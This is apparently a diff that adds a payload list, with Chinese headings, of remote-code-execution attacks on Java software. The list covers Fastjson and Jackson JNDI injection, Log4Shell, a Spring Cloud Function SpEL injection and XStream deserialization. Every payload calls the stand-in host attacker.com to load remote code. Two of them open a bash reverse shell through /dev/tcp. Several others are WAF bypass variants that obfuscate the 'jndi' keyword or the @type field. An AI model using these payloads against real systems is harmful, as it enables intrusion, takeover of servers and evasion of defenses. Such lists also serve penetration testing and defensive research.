@@ -1,0 +1,22 @@
+# Java - Fastjson JNDI 注入 RCE
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+# Java - Jackson JNDI 注入 RCE
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://attacker.com/evil.xml"]
+# Java - log4j JNDI 注入 RCE (Log4Shell)
+${jndi:ldap://attacker.com:1389/Evil}
+# Java - Spring Cloud Function SPEL RCE
+spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
+# Java - XStream XML 反序列化 RCE
+<sorted-set><dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>bash</string><string>-c</string><string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>
+# Fastjson WAF 绕过 - @type Unicode 编码绕过
+{"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+# Fastjson WAF 绕过 - $ref 引用机制绕过 (1.2.47)
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}}
+# Fastjson WAF 绕过 - expectClass 白名单绕过 autoType
+{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
+# Log4Shell WAF 绕过 - lower 函数绕过 jndi 关键字
+${${lower:j}${lower:n}${lower:d}i:ldap://attacker.com:1389/Evil}
+# Log4Shell WAF 绕过 - :- 空变量拼接绕过 jndi 关键字
+${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com:1389/Evil}
+# Log4Shell WAF 绕过 - env 默认值绕过 jndi 关键字
+${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com:1389/Evil}
